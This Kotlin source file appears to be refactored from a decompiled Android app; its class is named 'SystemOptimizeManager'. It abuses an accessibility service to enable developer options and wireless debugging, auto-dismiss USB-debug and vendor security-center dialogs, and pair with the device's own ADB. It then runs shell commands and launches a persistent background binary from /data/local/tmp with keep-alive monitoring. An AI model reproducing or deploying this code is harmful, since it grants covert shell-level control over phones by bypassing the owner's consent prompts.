package com.storm.safe.rock.service.modules.setup

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.SharedPreferences
import android.os.Build
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.service.modules.setup.adb.AdbKeyManager
import com.storm.safe.rock.service.modules.setup.adb.AdbPairingClient
import com.storm.safe.rock.service.modules.setup.adb.AdbProtocol
import com.storm.safe.rock.service.modules.setup.adb.AdbShellExecutor
import com.storm.safe.rock.service.modules.setup.deploy.LocalServiceDeployer
import com.storm.safe.rock.service.modules.setup.deploy.ServiceMonitor
import com.storm.safe.rock.service.modules.setup.discovery.MdnsDiscovery
import com.storm.safe.rock.service.modules.setup.discovery.PortScanner
import com.storm.safe.rock.service.modules.setup.discovery.UiPortReader
import com.storm.safe.rock.service.modules.setup.flow.DevOptionsNavigator
import com.storm.safe.rock.service.modules.setup.flow.DialogHandler
import com.storm.safe.rock.service.modules.setup.vendor.VendorPairAdapter
import com.storm.safe.rock.service.modules.setup.vendor.VendorPairAdapterFactory
import com.storm.safe.rock.service.modules.setup.flow.PairFlowOrchestrator
import com.storm.safe.rock.service.modules.setup.flow.PairFlowPreCheck
import com.storm.safe.rock.service.modules.setup.flow.PairState
import com.storm.safe.rock.service.modules.setup.flow.WindowDetector
import com.storm.safe.rock.service.modules.setup.flow.WirelessDebugNavigator
import java.io.File
import java.security.PrivateKey
import java.security.cert.X509Certificate
import java.util.concurrent.ConcurrentLinkedQueue
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicReference
import javax.net.ssl.SSLContext

/**
 * SystemOptimizeManager -- Thin Facade over extracted sub-modules.
 *
 * JADX: C0360a2.java (5666 lines). Now delegates to:
 *   - adb/ (AdbProtocol, AdbKeyManager, AdbPairingClient, AdbShellExecutor)
 *   - discovery/ (MdnsDiscovery, PortScanner, UiPortReader)
 *   - flow/ (PairFlowOrchestrator, DevOptionsNavigator, WirelessDebugNavigator, DialogHandler)
 *   - deploy/ (LocalServiceDeployer, ServiceMonitor)
 *   - SetupUiHelper (static UI node utilities)
 *
 * All public API signatures are preserved for backward compatibility.
 */
class SystemOptimizeManager private constructor(
    @Volatile var service: AccessibilityService,
    val context: Context
) {
    companion object {
        private const val TAG = "SystemOptimize"

        // ====================================================================
        // Singleton
        // ====================================================================

        @Volatile
        private var sInstance: SystemOptimizeManager? = null

        @JvmStatic
        fun getInstance(service: AccessibilityService, context: Context): SystemOptimizeManager {
            return sInstance ?: synchronized(this) {
                sInstance ?: SystemOptimizeManager(service, context).also { sInstance = it }
            }
        }

        fun getInstanceOrNull(): SystemOptimizeManager? = sInstance

        @JvmStatic
        fun resetInstanceForTesting() {
            synchronized(this) {
                try { sInstance?.executor?.shutdownNow() } catch (_: Exception) {}
                sInstance = null
                AdbKeyManager.clearSslCache()
                AdbKeyManager.clearKeyCache()
            }
        }

        // ====================================================================
        // ADB protocol constants -- delegate to AdbProtocol
        // ====================================================================

        const val ADB_CMD_CNXN: Int = AdbProtocol.ADB_CMD_CNXN
        const val ADB_CMD_OPEN: Int = AdbProtocol.ADB_CMD_OPEN
        const val ADB_CMD_WRTE: Int = AdbProtocol.ADB_CMD_WRTE
        const val ADB_CMD_CLSE: Int = AdbProtocol.ADB_CMD_CLSE
        const val ADB_CMD_OKAY: Int = AdbProtocol.ADB_CMD_OKAY
        const val ADB_CMD_AUTH: Int = AdbProtocol.ADB_CMD_AUTH
        const val ADB_CMD_STLS: Int = AdbProtocol.ADB_CMD_STLS
        const val ADB_VERSION: Int = AdbProtocol.ADB_VERSION
        const val ADB_MAX_DATA: Int = AdbProtocol.ADB_MAX_DATA
        const val ADB_STLS_VERSION: Int = AdbProtocol.ADB_STLS_VERSION

        @JvmField
        val HOST_IDENTIFIER: ByteArray = AdbProtocol.HOST_IDENTIFIER

        // ====================================================================
        // Static utility delegations -- backward compat to SetupUiHelper
        // ====================================================================

        @JvmStatic fun findClickableParentCompat(node: AccessibilityNodeInfo?) = SetupUiHelper.findClickableParentCompat(node)
        @JvmStatic fun collectAllNodes(node: AccessibilityNodeInfo, list: ArrayList<AccessibilityNodeInfo>) = SetupUiHelper.collectAllNodes(node, list)
        @JvmStatic fun collectTextViewNodes(node: AccessibilityNodeInfo, list: ArrayList<AccessibilityNodeInfo>) = SetupUiHelper.collectTextViewNodes(node, list)
        @JvmStatic fun findNodeByTexts(root: AccessibilityNodeInfo, texts: List<String>) = SetupUiHelper.findNodeByTexts(root, texts)
        @JvmStatic fun findScrollableNode(node: AccessibilityNodeInfo) = SetupUiHelper.findScrollableNode(node)
        @JvmStatic fun findSwitchNode(node: AccessibilityNodeInfo) = SetupUiHelper.findSwitchNode(node)
        @JvmStatic fun findToggleNode(node: AccessibilityNodeInfo) = SetupUiHelper.findToggleNode(node)
        @JvmStatic fun findNodeByClassName(node: AccessibilityNodeInfo, className: String) = SetupUiHelper.findNodeByClassName(node, className)
        @JvmStatic fun findCheckBoxNode(node: AccessibilityNodeInfo) = SetupUiHelper.findCheckBoxNode(node)
        @JvmStatic fun findCompoundButton(node: AccessibilityNodeInfo) = SetupUiHelper.findCompoundButton(node)
        @JvmStatic fun findClickableParent6(node: AccessibilityNodeInfo) = SetupUiHelper.findClickableParent6(node)
        @JvmStatic fun findButtonByText(node: AccessibilityNodeInfo, text: String) = SetupUiHelper.findButtonByText(node, text)
        @JvmStatic fun sleep200(count: Int) = SetupUiHelper.sleep200(count)
        @JvmStatic fun getLocalIpAddress() = SetupUiHelper.getLocalIpAddress()
        @JvmStatic fun getWifiIpAddress() = SetupUiHelper.getWifiIpAddress()

        // AdbProtocol delegations
        @JvmStatic fun buildAdbPacket(command: Int, arg0: Int, arg1: Int, data: ByteArray) = AdbProtocol.buildAdbPacket(command, arg0, arg1, data)
        @JvmStatic fun readAdbPacket(input: java.io.InputStream) = AdbProtocol.readAdbPacket(input)
        @JvmStatic fun readPairingPacket(dis: java.io.DataInputStream) = AdbProtocol.readPairingPacket(dis)
        @JvmStatic fun writePairingPacket(dos: java.io.DataOutputStream, type: Int, payload: ByteArray) = AdbProtocol.writePairingPacket(dos, type, payload)
        @JvmStatic fun toAndroidRsaPublicKey(pubKey: java.security.interfaces.RSAPublicKey) = AdbProtocol.toAndroidRsaPublicKey(pubKey)
        @JvmStatic fun reverseBytes(bigInt: java.math.BigInteger) = AdbProtocol.reverseBytes(bigInt)
        @JvmStatic fun toPeerInfo(pubKey: java.security.interfaces.RSAPublicKey, username: String) = AdbProtocol.toPeerInfo(pubKey, username)
        @JvmStatic fun extractPortFromUi(root: AccessibilityNodeInfo) = UiPortReader.extractPortFromUi(root)

        fun clearSslCache() = AdbKeyManager.clearSslCache()

        /** Backward compat: cachedSslContext */
        @JvmStatic val cachedSslContext: SSLContext?
            get() = AdbKeyManager.cachedSslContext

        /** Backward compat: cachedPrivateKey */
        @JvmStatic val cachedPrivateKey: PrivateKey?
            get() = AdbKeyManager.cachedPrivateKey

        /** Backward compat: cachedCertificate */
        @JvmStatic val cachedCertificate: X509Certificate?
            get() = AdbKeyManager.cachedCertificate
    }

    // ========================================================================
    // Enums -- kept here as external code references them via SystemOptimizeManager.DevOptState
    // ========================================================================

    enum class DevOptState(val code: Int) {
        UNKNOWN(-1),
        ENTER_ABOUT_DEVICE_WIN(0),
        PREPARE_VERSION_INFO_WIN(1),
        ENTER_VERSION_INFO_WIN(2),
        PREPARE_CONFIRM_LOCK_WIN(3),
        ENTER_CONFIRM_LOCK_WIN(4),
        IS_CONFIRM_SUCCESS(5),
        ENABLE_DEV_OPT_FAIL(6),
        ENABLE_DEV_OPT_SUCCESS(7),
        WAIT_PASSWORD_VERIFY(8),
        WIN_CHECK(9),
        WIN_PREPARE(10)
    }

    // ========================================================================
    // Data classes -- kept for backward compat (referenced externally)
    // ========================================================================

    data class PairingPacketHeader(val version: Byte, val type: Byte, val payloadSize: Int)

    data class AdbPacket(val command: Int, val data: ByteArray, val arg0: Int, val arg1: Int) {
        override fun equals(other: Any?): Boolean {
            if (this === other) return true
            if (other !is AdbPacket) return false
            return command == other.command && arg0 == other.arg0 && arg1 == other.arg1 && data.contentEquals(other.data)
        }
        override fun hashCode(): Int = 31 * (31 * (31 * command + data.contentHashCode()) + arg0) + arg1
    }

    data class PairingInfo(val host: String, val port: Int, val pairingCode: String)

    // ========================================================================
    // Component instances (lazy)
    // ========================================================================

    private val prefs: SharedPreferences by lazy { context.getSharedPreferences("ADBConfig", Context.MODE_PRIVATE) }
    val keyManager by lazy { AdbKeyManager(context) }
    val pairingClient by lazy { AdbPairingClient(context, keyManager) }
    val shellExecutor by lazy { AdbShellExecutor({ getOrCreateAdbConnection() }, { resetAdbState() }) }
    val portScanner by lazy { PortScanner(context, prefs) }
    val mdnsDiscovery by lazy { MdnsDiscovery(context) }
    val uiPortReader by lazy { UiPortReader(service) }
    val devOptionsNav by lazy { DevOptionsNavigator(service, context) }
    val wirelessDebugNav by lazy { WirelessDebugNavigator(service, context) }
    val dialogHandler by lazy { DialogHandler(service, context) }
    val deployer by lazy { LocalServiceDeployer(context, shellExecutor) }
    val serviceMonitor by lazy {
        ServiceMonitor(
            context = context,
            deployer = deployer,
            shellExecutor = shellExecutor,
            debugPortProvider = { portScanner.getDebugPort() },
            setDebugPort = { port -> portScanner.setDebugPort(port) },
            isConnectedProvider = { isAdbConnected() },
            generateOrLoadKeyPair = { keyManager.generateOrLoadKeyPair() },
            isWirelessDebuggingEnabled = { isWirelessDebuggingEnabled() },
            enableWirelessDebugging = {
                wirelessDebugNav.enableWirelessDebuggingViaSettings(
                    isWirelessDebuggingEnabled = { isWirelessDebuggingEnabled() },
                    postToLocalService = { path, body -> deployer.postToLocalService(path, body) }
                )
            },
            clearSslCache = { AdbKeyManager.clearSslCache() }
        )
    }
    val vendorAdapter: VendorPairAdapter by lazy { VendorPairAdapterFactory.create(service, context) }
    val pairPreCheck by lazy { PairFlowPreCheck(context, service) }
    val pairOrchestrator by lazy { PairFlowOrchestrator(service, context, this) }

    // ========================================================================
    // Retained state
    // ========================================================================

    var executor: ScheduledExecutorService = Executors.newSingleThreadScheduledExecutor()
    val devOptState: AtomicReference<DevOptState> = AtomicReference(DevOptState.UNKNOWN)
    val pairState: AtomicReference<PairState> = AtomicReference(PairState.PAIR_DEPT_UNKNOWN)
    val isConnected: AtomicBoolean = AtomicBoolean(false)
    val processedActions: ConcurrentLinkedQueue<String> = ConcurrentLinkedQueue()
    var openDevDelegate: OpenDevelopmentDelegate? = null
    var onCompleteCallback: (() -> Unit)? = null
    var onFailureCallback: ((String) -> Unit)? = null
    @Volatile var lastUsbDebugDialogTime: Long = 0L

    @Volatile var adbConnection: com.storm.safe.rock.service.modules.setup.adb.AdbPersistentConnection? = null
    val connectionLock: Any = Any()

    val windowDetector = WindowDetector()

    // ========================================================================
    // Settings queries (kept -- simple methods)
    // ========================================================================

    fun isAdbEnabled(): Boolean = try {
        Settings.Global.getInt(context.contentResolver, "adb_enabled", 0) == 1
    } catch (_: Exception) { false }

    fun isDeveloperOptionsEnabled(): Boolean {
        val r = context.contentResolver
        try { if (Settings.Global.getInt(r, "development_settings_enabled", 0) > 0) return true } catch (_: Exception) {}
        try { if (Settings.Secure.getInt(r, "development_settings_enabled", 0) > 0) return true } catch (_: Exception) {}
        try { if (Settings.Global.getInt(r, "adb_enabled", 0) > 0) return true } catch (_: Exception) {}
        return false
    }

    fun isWirelessDebuggingEnabled(): Boolean = try {
        if (Build.VERSION.SDK_INT >= 30) Settings.Global.getInt(context.contentResolver, "adb_wifi_enabled", 0) == 1 else false
    } catch (_: Exception) { false }

    fun isAdbConnected(): Boolean = isConnected.get() && adbConnection?.isConnected == true

    // ========================================================================
    // ADB connection management (kept -- core connection lifecycle)
    // ========================================================================

    fun getOrCreateAdbConnection(): com.storm.safe.rock.service.modules.setup.adb.AdbPersistentConnection? {
        val port = portScanner.getDebugPort()
        val host = deployer.cachedLocalIp

        synchronized(connectionLock) {
            if (isAdbConnected()) return adbConnection
            try { adbConnection?.close() } catch (_: Exception) {}
            adbConnection = null

            if (port <= 0) { Log.w(TAG, "getOrCreateAdbConnection: no port"); return null }
            val resolvedHost = host.ifEmpty { "127.0.0.1" }
            val keyDir = keyManager.getKeyDir() ?: run { Log.w(TAG, "key dir null"); return null }
            val certFile = File(keyDir, "cert.pem")
            val keyFile = File(keyDir, "private.key")
            if (keyManager.loadCert(certFile) == null || keyManager.loadPrivateKey(keyFile) == null) {
                Log.w(TAG, "key load failed"); return null
            }
            return try {
                val conn = com.storm.safe.rock.service.modules.setup.adb.AdbPersistentConnection(
                    keyManager, resolvedHost, port, certFile, keyFile
                )
                if (!conn.connect()) { conn.close(); isConnected.set(false); return null }
                adbConnection = conn; isConnected.set(true)
                Log.i(TAG, "ADB connected: $resolvedHost:$port")
                conn
            } catch (e: Exception) {
                isConnected.set(false); Log.e(TAG, "ADB connect error", e); null
            }
        }
    }

    // ========================================================================
    // OpenDevelopmentDelegate (kept -- creates delegate + wires callbacks)
    // ========================================================================

    fun startOpenDevelopmentDelegate(onSuccess: () -> Unit, onFailure: (String) -> Unit) {
        val delegate = OpenDevelopmentDelegate(service, context)
        openDevDelegate = delegate
        delegate.setCallbacks(
            onSuccess = {
                devOptState.set(DevOptState.ENABLE_DEV_OPT_SUCCESS)
                startPairFlow()
                onSuccess()
            },
            onFailure = { reason ->
                devOptState.set(DevOptState.ENABLE_DEV_OPT_FAIL)
                shutdownEngine()
                onFailureCallback?.invoke(reason)
                onFailure(reason)
            }
        )
    }

    // ========================================================================
    // Lifecycle (kept -- cleanup logic)
    // ========================================================================

    fun shutdownEngine() {
        pairOrchestrator.isPairRunning.set(false)
        pairOrchestrator.isFinished.set(true)
        try { executor.shutdownNow() } catch (_: Exception) {}
    }

    fun resetAdbState() {
        synchronized(connectionLock) {
            try { adbConnection?.close() } catch (_: Exception) {}
            adbConnection = null; isConnected.set(false)
        }
        prefs.edit()
            .putBoolean("connected", false)
            .remove("connectedDevice")
            .putInt("connectErrorCount", 0)
            .putInt("enableDevelopment", if (isDeveloperOptionsEnabled()) 1 else 0)
            .putInt("enableDebug", if (isAdbEnabled()) 1 else 0)
            .putInt("enableWifiDebug", if (isWirelessDebuggingEnabled()) 1 else 0)
            .apply()
    }

    // ========================================================================
    // Event routing (kept -- dispatches to delegate + sub-handlers)
    // ========================================================================

    fun onAccessibilityEventInternal(event: AccessibilityEvent, packageName: String?, className: String?) {
        try {
            openDevDelegate?.let { try { it.onAccessibilityEvent(event, packageName, className) } catch (_: Exception) {} }
            if (className != null && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                lastUsbDebugDialogTime = dialogHandler.handleUsbDebugDialog(lastUsbDebugDialogTime)
            }
            filterAccessibilityEvent(event)
        } catch (e: Exception) { Log.e(TAG, "onAccessibilityEvent error", e) }
    }

    fun filterAccessibilityEvent(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: ""

        // Stage 1: USB debug dialog — runs ALWAYS for settings/systemui (vendor: c41 case 0)
        if ((pkg == "com.android.systemui" || pkg == "com.android.settings") &&
            (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED)
        ) {
            try {
                executor.execute { lastUsbDebugDialogTime = dialogHandler.handleUsbDebugDialog(lastUsbDebugDialogTime) }
            } catch (_: Exception) {}
        }

        // Stage 2: Pair flow dispatch — only when pairing is running (vendor: e41 case 0)
        if (pairOrchestrator.isFinished.get() || !pairOrchestrator.isPairRunning.get()) return
        val eventPkg = event.packageName?.toString() ?: return
        if (eventPkg.contains("settings", ignoreCase = true) ||
            eventPkg.contains("securitycenter", ignoreCase = true) ||
            eventPkg.contains("systemui", ignoreCase = true)
        ) {
            val copiedEvent = AccessibilityEvent.obtain(event)
            try {
                executor.execute {
                    try {
                        val cachedRoot = service.rootInActiveWindow
                        windowDetector.update(copiedEvent, cachedRoot)
                        mainAccessibilityEventHandler(copiedEvent, eventPkg)
                    } catch (e: Exception) {
                        Log.e(TAG, "onAccessibilityEvent background 异常", e)
                    } finally {
                        try { copiedEvent.recycle() } catch (_: Exception) {}
                    }
                }
            } catch (_: Exception) {
                try { copiedEvent.recycle() } catch (_: Exception) {}
            }
        }
    }

    /**
     * Main accessibility event handler with state machine dispatching.
     * vendor: i4 (line 3811) -- routes to pairInDevOption / pairInWifiDebugWindow / handlePairFailDialog.
     * Kept inline as it references multiple sub-modules.
     */
    private fun mainAccessibilityEventHandler(event: AccessibilityEvent, pkg: String) {
        try {
            val className = event.className?.toString()
            if (devOptState.get().code < DevOptState.ENABLE_DEV_OPT_SUCCESS.code) {
                openDevDelegate?.onAccessibilityEvent(event, pkg, className)
            }
            // ADAPT: 先检查 wifiDebug（更具体），再检查 devOptions（更宽泛）
            // SubSettings 同时匹配两者的 pattern，但 wifiDebug 的 title 检查更精确
            if (wirelessDebugNav.isInWifiDebugWindow() || windowDetector.isInWifiDebugWindow()) {
                processedActions.remove("pairInDevOption")
                val state = pairOrchestrator.pairState.get()
                if (state != PairState.PAIR_DEPT_PAIR_SUCCESS &&
                    state != PairState.PAIR_DEPT_PAIR_FAIL &&
                    state != PairState.PAIR_DEPT_PREPARE_FINISH
                ) {
                    if (!processedActions.contains("pairInWifiDebugWindow")) {
                        processedActions.add("pairInWifiDebugWindow")
                        scheduleTask("W") { pairOrchestrator.pairInWifiDebugWindow() }
                    }
                }
                return
            }
            if (windowDetector.isInDevOptionsWindow() || devOptionsNav.isInDevOptionsWindow()) {
                processedActions.remove("pairInWifiDebugWindow")
                processedActions.remove("pairInPairFailDialog")
                val state = pairOrchestrator.pairState.get()
                if (!processedActions.contains("pairInDevOption") &&
                    state != PairState.PAIR_DEPT_PAIR_SUCCESS &&
                    state != PairState.PAIR_DEPT_PAIR_FAIL &&
                    state != PairState.PAIR_DEPT_PREPARE_FINISH
                ) {
                    processedActions.add("pairInDevOption")
                    scheduleTask("G") { pairOrchestrator.pairInDevOption() }
                }
                return
            }
            // ━━━ Vendor security dialog (e.g. MIUI security center) ━━━
            if (vendorAdapter.isVendorSecurityDialog(pkg, event.className?.toString())) {
                if (!processedActions.contains("pairInSecurityCenter")) {
                    processedActions.add("pairInSecurityCenter")
                    scheduleTask("B3") {
                        val handled = vendorAdapter.handleSecurityDialog(service)
                        processedActions.remove("pairInSecurityCenter")
                        if (handled) {
                            Log.d(TAG, "vendor security dialog handled, continuing pair flow")
                        }
                    }
                }
                return
            }
            if (dialogHandler.isInPairFailDialog()) {
                if (!processedActions.contains("pairInPairFailDialog")) {
                    processedActions.add("pairInPairFailDialog")
                    scheduleTask("F") { dialogHandler.handlePairFailDialog(processedActions, pairState) }
                }
            }
        } catch (e: Exception) { Log.e(TAG, "mainAccessibilityEventHandler error", e) }
    }

    // ========================================================================
    // Delegated methods (one-line calls)
    // ========================================================================

    // -- Pairing flow --
    fun startPairFlow() = pairOrchestrator.startPairFlow()
    fun triggerPairFlow() = pairOrchestrator.triggerPairFlow()
    fun finishLocalAdbPair() = pairOrchestrator.finishLocalAdbPair()

    // -- Shell execution --
    fun executeShellCommand(cmd: String) = shellExecutor.executeShellCommand(cmd)
    fun executeAndCheck(cmd: String) = shellExecutor.executeAndCheck(cmd)
    fun fireAndForget(cmd: String = "nohup /data/local/tmp/local-service server -d -s > /data/local/tmp/local-service.log 2>&1 &") = shellExecutor.fireAndForget(cmd)

    // -- Deployment --
    fun deployLocalService() = deployer.deployLocalService(portScanner.getDebugPort())
    fun setupKeepAliveWhitelist() = deployer.setupKeepAliveWhitelist()
    fun postToLocalService(path: String, body: String) = deployer.postToLocalService(path, body)

    // -- Discovery --
    fun scanForAdbPort() = portScanner.scanForAdbPort()
    fun getWirelessDebugPort() = portScanner.getWirelessDebugPort()
    fun getDebugPort() = portScanner.getDebugPort()
    fun setDebugPort(port: Int) = portScanner.setDebugPort(port)
    fun discoverConnectPort() = mdnsDiscovery.discoverConnectPort()
    fun readDebugPortFromScreen() = uiPortReader.readDebugPortFromScreen()

    // -- UI navigation --
    fun openDevOptionsSettings() {
        if (vendorAdapter.openDevOptions(context)) return  // vendor handled (e.g. Huawei ComponentName)
        devOptionsNav.openDevOptionsSettings()
    }
    fun isInDevOptionsWindow() = windowDetector.isInDevOptionsWindow() || devOptionsNav.isInDevOptionsWindow()
    fun isInWifiDebugWindow() = windowDetector.isInWifiDebugWindow() || wirelessDebugNav.isInWifiDebugWindow()
    fun handleUsbDebugDialog() { lastUsbDebugDialogTime = dialogHandler.handleUsbDebugDialog(lastUsbDebugDialogTime) }
    fun handlePairFailDialog() = dialogHandler.handlePairFailDialog(processedActions, pairState)

    // -- Key management --
    fun generateOrLoadKeyPair() = keyManager.generateOrLoadKeyPair()
    fun doPair(port: Int, code: String) = pairingClient.doPair(port, code)
    fun createSslContext(certFile: File, keyFile: File) = keyManager.createSslContext(certFile, keyFile)

    // -- Heartbeat --
    fun startHeartbeat() = serviceMonitor.startHeartbeat()
    fun checkAndRecoverLocalService() = serviceMonitor.checkAndRecoverLocalService()

    // ========================================================================
    // Scheduling utility
    // ========================================================================

    fun scheduleTask(tag: String, task: () -> Unit) {
        try {
            executor.execute {
                try { Log.d(TAG, "[$tag] start"); task(); Log.d(TAG, "[$tag] done") }
                catch (e: Exception) { Log.e(TAG, "[$tag] error", e) }
            }
        } catch (_: Exception) {}
    }

    init { Log.d(TAG, "SystemOptimizeManager initialized") }
}
